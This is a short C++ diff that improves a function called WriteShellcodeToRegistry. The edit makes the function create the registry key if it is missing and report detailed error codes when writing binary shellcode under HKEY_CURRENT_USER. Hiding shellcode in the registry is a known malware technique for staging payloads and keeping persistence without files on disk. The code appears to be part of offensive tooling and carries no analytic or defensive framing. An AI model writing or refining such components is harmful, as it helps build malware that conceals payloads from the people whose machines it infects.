@@ -4,13 +4,20 @@
 
 bool WriteShellcodeToRegistry(const std::string& key, const std::string& valueName, const BYTE* data, DWORD dataSize) {
     HKEY hKey;
-    if (RegOpenKeyExA(HKEY_CURRENT_USER, key.c_str(), 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
-        std::cerr << "Failed to open registry key for writing.\n";
+    // Try to create or open the registry key with write access
+    LONG createRes = RegCreateKeyExA(HKEY_CURRENT_USER, key.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
+
+    if (createRes != ERROR_SUCCESS) {
+        std::cerr << "Failed to create or open registry key. Error code: " << createRes
+            << " (Last Error: " << GetLastError() << ")\n";
         return false;
     }
 
-    if (RegSetValueExA(hKey, valueName.c_str(), 0, REG_BINARY, data, dataSize) != ERROR_SUCCESS) {
-        std::cerr << "Failed to write to registry.\n";
+    // Try to set the registry value
+    LONG setRes = RegSetValueExA(hKey, valueName.c_str(), 0, REG_BINARY, data, dataSize);
+    if (setRes != ERROR_SUCCESS) {
+        std::cerr << "Failed to write to registry. Error code: " << setRes
+            << " (Last Error: " << GetLastError() << ")\n";
         RegCloseKey(hKey);
         return false;
     }
